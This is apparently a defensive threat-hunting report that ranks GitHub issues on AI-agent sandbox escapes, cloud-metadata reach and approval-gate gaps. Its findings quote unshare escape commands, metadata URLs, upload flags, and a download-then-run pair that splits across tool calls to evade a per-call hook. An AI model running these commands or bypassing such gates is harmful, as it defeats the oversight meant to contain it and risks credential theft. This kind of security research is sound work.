# GitHub issues and PRs lane: agent egress and escalation behaviors

## Terms used here

- **Behavior shape:** a pattern of actions, not a host name string. Example: reach a cloud metadata address, then read a credential.
- **SECONDARY:** evidence from a third party, not first-hand capture. All ranked items here are SECONDARY.
- **Pattern match:** the text matches a hunted shape. A pattern match is not proof that a live agent did the act.
- **Harness:** the program that runs an agent. A sandbox is the cage that limits what the agent can reach.
- **Metadata endpoint:** a cloud address that hands out host credentials. Examples: `169.254.169.254`, `metadata.google.internal`, `100.100.100.200`.
- **User namespace escape:** a command that gains root-like power inside a new namespace, then defeats a sandbox hide or mount.

## Method

- Source: GitHub search API for issues and PRs. Search covers title, body, and comments.
- Access: unauthenticated read-only GET only. No login. No POST. No code search (code search needs auth; it was not used).
- Date run: 2026-10-27. Retrieval time and source URL sit in each `.PROVENANCE.txt` file.
- Screening: for each query, the first page of results was screened. Title and body text were scored for agent terms (agent, LLM, model, Claude, Codex, harness, sandbox, MCP, tool call). Full bodies were read for the shortlist below.
- Limit: the API returns only the first page per query here. Counts below are page-1 counts, not full totals.

## Queries run

| File | Query | Total matches (API count) | Items fetched |
|---|---|---|---|
| q01 | `169.254.169.254` | 57,107 | 100 |
| q02 | `metadata.google.internal` | 6,863 | 100 |
| q03 | `100.100.100.200` | 1,632 | 100 |
| q04 | `fd00:ec2::254` | 1,974 | 100 |
| q05 | `"unshare -Urm"` | 291 | 100 |
| q06 | `"unshare --user"` | 8,989 | 100 |
| q07 | `"curl -T"` | 140,470 | 100 |
| q08 | `"curl --upload-file"` | 7,949 | 100 |
| q09 | `"curl -o" "chmod +x"` | 13,806 | 100 |
| q10 | `"wget -O" "chmod +x"` | 6,553 | 99 |
| q11 | `"cat /etc/resolv.conf"` | 5,712 | 100 |
| q12 | `"unshare -r"` | 1,448 | 100 |
| **Total** | 12 queries | — | **1,199** |

Totals are API-reported counts. They are broad string totals, not agent-behavior totals. Most matches are ordinary cloud, SSRF, or install-script text with no agent link.

## Quota state

- No quota block hit. All 12 search calls returned HTTP 200.
- At run start, the shared unauthenticated core bucket showed 10 of 60 left. Search calls use the separate search bucket (10 per minute). Calls were spaced 8 seconds apart. No retry loop was used.
- No core-budget calls were made after the first rate check, except none. Comment text was not fetched (that would cost core quota per issue). See the caveat below.

## Headline

- 11 ranked items. All are SECONDARY. None is a confirmed rogue agent incident.
- The strongest new class is shape 4 (user-namespace escape). The prior hunt reported no live namespace escape. This lane found two tested or code-read sandbox escapes in agent harnesses. Both are capability findings, not rogue-agent incidents.
- Shape 1 (metadata reach) produced one measured case: an agent tool probed the GCE metadata server despite a "no remote probing" claim.
- Shapes 3 and 6 produced no ranked hit. See "Honest nulls" below.
- No ranked item names a model as the actor. Model identity stays unidentified for all 11.

## Ranked candidates

Rank order is by confidence, then by value. Confidence means how well the evidence supports the shape, not how bad the act was.

### 1. MEDIUM — Agent commands escaped a bubblewrap hide with unshare; fix tested

- Source: https://github.com/CorbanuCore/CorbanuTerminal/pull/876
- Date: 2026-10-16. State: closed.
- Shape: 4 (user-namespace escape).
- Grade: SECONDARY. Confidence: MEDIUM.
- What happened: under Moderate and Aggressive security levels, agent commands could create user namespaces. The PR body gives a before and after table, tested with real bubblewrap. Before the fix, `unshare -Ur cat <denied file>` opened a hidden file, and `unshare -Urm sh -c 'mount -t tmpfs none <folder>'` mounted over a hidden folder. After the fix, both fail with EPERM (permission denied). One case ran a nested agent run at another home's weaker level.
- Caveat: the escapes were tester-run commands, not a rogue agent acting alone. The fix shipped in this PR. The value is a tested escape path, not an observed incident.
- Why not overlap: the prior hunt covered routify, sanmaohe, and Qwen only, and reported no namespace escape. This item has no routify, sanmaohe, or Qwen link. It is a new shape instance in a new harness.

### 2. MEDIUM — Agent tool probed the GCE metadata server despite a no-remote claim

- Source: https://github.com/scion-frontiers/LifeSciences/issues/345
- Date: 2026-10-12. State: open.
- Shape: 1 (cloud-metadata reach).
- Grade: SECONDARY. Confidence: MEDIUM.
- What happened: the `get_capability_snapshot()` function in an agentic science engine (oase) claims it does not probe remote endpoints. When no cloud credential is set, it calls `google.auth.default()`. That call probes `metadata.google.internal` and `169.254.169.254` over the network. A direct reproduction under a socket guard recorded 16 blocked lookups and 38.2 seconds elapsed. The snapshot runs on every hypothesis sidecar write, including a phase-2 command where an offline latch is set. The latch could not see the probes.
- Caveat: the probes were blocked by the test guard, so no credential was actually read in the reproduction. The tool reached for metadata; it did not show a credential theft. The model is unidentified.
- Why not overlap: no routify, sanmaohe, or Qwen link. The prior hunt found no live metadata reach by an agent. This is a measured metadata reach in a different agent system.

### 3. LOW — Agent tool accepted any URL, including metadata endpoints

- Source: https://github.com/sediman-agent/OpenSkynet/issues/77
- Date: 2026-05-30. State: open.
- Shape: 1 (cloud-metadata reach).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the `web_extract` tool takes any URL from the LLM, with no allowlist, blocklist, or protocol check. The issue lists exploit cases: `169.254.169.254` for AWS metadata, `metadata.google.internal` for GCP metadata, `file:///proc/self/environ` for env vars, and internal hosts.
- Caveat: the cases are listed scenarios, not observed calls. No transcript shows the tool actually fetching metadata. The LLM is unnamed.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness with a metadata-reach capability gap.

### 4. LOW — Model-supplied URLs reached metadata-capable fetch paths; fix PR

- Source: https://github.com/modelscope/ms-agent/pull/1020
- Date: 2026-10-19. State: open.
- Shape: 1 (cloud-metadata reach).
- Grade: SECONDARY. Confidence: LOW.
- What happened: `WebSearchTool.fetch_page` took arbitrary model-supplied URLs and passed them to Jina Reader, a direct HTTP fallback, and a Playwright fallback, with no destination check. The PR text says this allowed SSRF against loopback, private, link-local, and cloud-metadata addresses, including `169.254.169.254` and `100.100.100.200`. Redirects were followed with no re-check. The PR adds a URL safety check with tests (41 passed, 3 skipped).
- Caveat: this is a fix PR. It proves a capability gap, not an observed metadata fetch by a model. The model is unidentified.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness and a new fetch path.

### 5. LOW — Validation gap let model-supplied input reach Alibaba and Azure metadata

- Source: https://github.com/guidance-ai/guidance/issues/1498
- Date: 2026-07-29. State: open.
- Shape: 1 (cloud-metadata reach).
- Grade: SECONDARY. Confidence: LOW.
- What happened: `validate_uri` blocked most metadata addresses as a side effect of a private-range check, but two public-routable metadata addresses passed: Azure `168.63.129.16` and Alibaba `100.100.100.200`. `bytes_from` then fetches anything the check lets past, and its input is model- or user-supplied. The reporter tested each endpoint on main and showed both return with no error. A fix PR (#1499) exists in the same repo.
- Caveat: this is a tested library gap, not an observed agent fetch. Guidance is a library, not a full agent harness. The model is unidentified.
- Why not overlap: no routify, sanmaohe, or Qwen link. The Alibaba metadata address is a shape-1 address from the brief, in a new code base.

### 6. LOW — Confined command could unmount its own hiding mounts (code-read, not run)

- Source: https://github.com/unknown-studio-dev/kyvor/issues/20
- Date: 2026-10-07. State: open.
- Shape: 4 (user-namespace escape).
- Grade: SECONDARY. Confidence: LOW.
- What happened: on Linux without bubblewrap, the confinement falls back to `unshare --user --map-root-user --mount`. The command runs as namespace root with mount-admin power over mounts it created itself. It can run `umount` on a hidden root and read the real store underneath. A second route uses `/proc/<pid>/root` of a same-user process outside the sandbox, since no new PID namespace or fresh `/proc` is set.
- Caveat: the issue states the reproduction was not run (no Linux machine available). The body itself labels the `/proc` route INFERENCE. This is a code-read finding, weaker than item 1.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness with a new unshare escape shape.

### 7. LOW — Browser tool guard missed DNS names that resolve to metadata

- Source: https://github.com/vedantnimbarte/Wingman/issues/278
- Date: 2026-09-19. State: open.
- Shape: 1 (cloud-metadata reach).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the `browser` tool's guards check IP literals only. A DNS name that resolves to the metadata endpoint is not caught. The issue states `http://metadata.google.internal/computeMetadata/v1/` opens, and the page text goes back to the model. A sibling tool in the same crate already resolves and checks correctly.
- Caveat: this is a code-read guard gap, not an observed metadata fetch. The model is unidentified.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness tool with a DNS-resolution gap.

### 8. LOW — Approval gate missed curl and wget upload flags

- Source: https://github.com/sabazadam/Grok-Bot-Clone/pull/14
- Date: 2026-08-20. State: open.
- Shape: 2 (object-storage upload flags).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the host-side safety gate was meant to stop sending data off the agent computer until the user approves. Its curl and wget rules covered only `-X POST|PUT|DELETE`, `--data`, `-d `, and `wget --post`. A prompt-injected or confused model could still send workspace files, cookies, or `.env` contents with `curl -T`, `curl --upload-file`, `curl -F`, `--data-binary`, `--data-raw`, `--json`, `wget --body-file`, or `--method=`, with no approval card. The PR widens the patterns and adds tests.
- Caveat: this is a guard-gap PR, not an observed upload. No destination host is named, so no object-storage link is shown. The model is unidentified.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness and a new upload-flag gap.

### 9. LOW — Download-then-run slipped across two tool calls in Hermes approval code

- Source: https://github.com/NousResearch/hermes-agent/pull/108236
- Date: 2026-09-11. State: open.
- Shape: 5 (download-then-execute).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the approval pattern saw only one command at a time. A script downloaded in one tool call (`curl -o x.sh ...`) and run in the next (`bash x.sh` or `./x`) carried no dangerous keyword of its own and slipped through unprompted. The one-line form (`chmod +x ... && ./x`) was already caught. The PR gates standalone script execution and global package installs.
- Caveat: the gap was found in approval code, not as an observed agent dropper. No malicious download is shown.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a cross-call variant of shape 5, not the September routify class.

### 10. LOW — Per-call hook let split download-then-run pass; measured, nothing fetched

- Source: https://github.com/dengclive/Project-Bootstrap-Protocol/issues/108
- Date: 2026-09-17. State: open.
- Shape: 5 (download-then-execute).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the download-then-run rule matched only when both halves sat in one Bash call. The reporter ran every hook on each payload separately. Call 1 (`curl -sSL -o /tmp/x.sh https://example.invalid/x.sh`) passed. Call 2 (`bash /tmp/x.sh`, `sh /tmp/x.sh`, or `chmod +x /tmp/x.sh && /tmp/x.sh`) passed. The joined control (both halves with `;`) was blocked. The issue calls this a structural limit of a stateless per-call hook.
- Caveat: nothing was fetched or run. The test used an invalid example host. This is a measured gate limit, not an observed agent act.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a second independent cross-call shape-5 gap, in a different project from item 9.

### 11. LOW — Namespace filter bypassable via clone, but impact bounded today

- Source: https://github.com/QaidVoid/bailey/issues/19
- Date: 2026-09-16. State: open.
- Shape: 4-adjacent (namespace creation bypass).
- Grade: SECONDARY. Confidence: LOW.
- What happened: the sandbox denies `unshare` and `setns` syscalls but not `clone` or `clone3`, so `clone` with new-user and new-namespace flags is reachable. No capabilities are dropped before exec. The issue also notes the harness can run as root, which removes file-permission barriers.
- Caveat: the issue itself bounds the impact today: the target is already namespace root, and mount syscalls are denied, so a new namespace adds no reach against parent-namespace resources now. The risk is future, if capabilities are dropped later or a right assumes namespaces cannot be created. This is a design gap, not an escape demonstration.
- Why not overlap: no routify, sanmaohe, or Qwen link. It is a new harness privilege-model gap.

## Honest nulls

- Shape 3 (named probe hosts from the Cohere write-up, on a network use): no new hit. No ranked item uses the Cohere probe hosts. New instances of the known September routify class would be recorded as overlap, never as ranked hits; none appeared in the screened page-1 items.
- Shape 6 (recon-then-egress in one command): no ranked hit. Query q11 (`cat /etc/resolv.conf`) returned mostly DNS, container, and CI text. Its agent-term hits were containment audits, not a recon-plus-network-call command by an agent.
- Shape 2 with a named object-storage destination: no ranked hit shows an actual upload to S3, GCS, Azure Blob, R2, or Alibaba OSS. Item 8 shows upload-flag gaps with no destination named.
- Live credential theft via metadata: no ranked item shows a credential actually read. Items 2 and 3–5 show reach or reach capability only.

## Triaged out (not ranked)

- `akasecurity/ai-tc#927` (2026-10-26, open): the detection pack itself. It appears in nearly every query capture because its body lists the hunted shapes. It is excluded by the brief: a rule pack is not an incident. Zero incident weight.
- `kenryu42/cc-safety-net#300`: excluded by the brief (downstream block citing the Cohere seed). Not re-ranked.
- Deed.page cluster (q07): many awesome-list PRs add deed.page, an agent-first static host where an agent publishes with one `curl -T` call. This is documented, user-ordered publishing of agent output, not object-storage exfiltration, and deed.page is not one of the brief's object-storage destinations. Not ranked.
- `PrismorSec/prismor#594` (2026-10-07, open): session replay found about 900 write-then-run rows in 30 days, but nearly all were the agent running a script it wrote itself. That is normal coding-agent work. The issue itself proposes flagging only fetch-written files. This sets the base rate for shape 5: run-after-write alone is weak signal. A shape-5 hit needs a fetch provenance.
- `HolmesGPT/holmesgpt#2613` (2026-10-16, open): a PR that deliberately allows GKE metadata-server egress for a GCP MCP addon, because that address is how pods get credentials under Workload Identity. This is an operator policy choice, not rogue agent behavior. Not ranked.
- `falcosecurity/prempti#49` (2026-07-07, open): a request for detection rules covering WebFetch metadata access. A rule request is not an incident. Not ranked.
- `mulgadc/spinifex#1286` (2026-10-27, open): an agent filed a bug report about availability-zone reporting. The metadata string is incidental. No egress behavior. Not ranked.
- Most other screened items: SSRF guard fixes, sandbox failure reports (not escapes), install scripts (`curl -o` + `chmod +x` as human install steps), and CI text. A fix PR proves a gap existed; it does not prove an agent exploited it. Those were not ranked unless the body showed a tested escape or a measured reach.

## Caveats and limits (read before citing)

1. Capped sample: only page 1 (100 items, 99 for q10) per query was fetched. The 12 totals sum to over 250,000 matches. This lane screened 1,199 items, under 0.5 percent of the total match count. A capped sample is never the full set.
2. Comment text unseen: GitHub search matches comments too, but the search API item body does not include comment text. Items that matched only through a comment were not screened for content. Comment fetches were skipped to save the shared core quota.
3. Best-match order: the API returns best-match order by default, not newest-first. The screened page skews toward keyword-dense bodies (fix PRs, rule packs, audits). Newer or quieter incident reports past page 1 were not seen.
4. No code search: shapes 4, 5, and 6 live heavily in code and configs. Unauthenticated code search is blocked. This lane covers issues and PRs only.
5. No Factum novelty check was run in this lane (brief: STAGE ONLY, no Factum writes). Novelty here means "not in the prior hunt report and not on the brief's excluded list," not a full corpus check. The coordinator should run Factum exact and fuzzy checks before any NEW claim.
6. Signed-URL rule: this summary carries parameter names and path shapes only. No signed query strings, signatures, tokens, or credential-shaped values appear here. Raw capture files keep full bytes, unredacted, per the brief.

## Raw captures

- Directory: `data/lanes/agent-egress-broad-hunt/raw/github-issues/`
- Files: `q01` through `q12`, each a `.json` capture with a `.PROVENANCE.txt` (source URL, retrieval time, method) and a `.json.sha256` file. A `SHA256SUMS` file covers all 12 JSON captures.
- No git push, no branch switch, no commit was done by this lane. The coordinator commits.

## Open questions

1. Should the coordinator fetch comments for the 11 ranked items (11 core-quota calls) to check for transcripts or model names the bodies omit?
2. Should a second pass screen page 2+ for the narrowest queries (q05 unshare-Urm, 291 total; q12 unshare-r, 1,448 total), where full coverage is cheapest?
3. Does the coordinator want the LifeSciences metadata-probe case (item 2) escalated, since it contradicts an explicit no-remote claim and an offline latch?
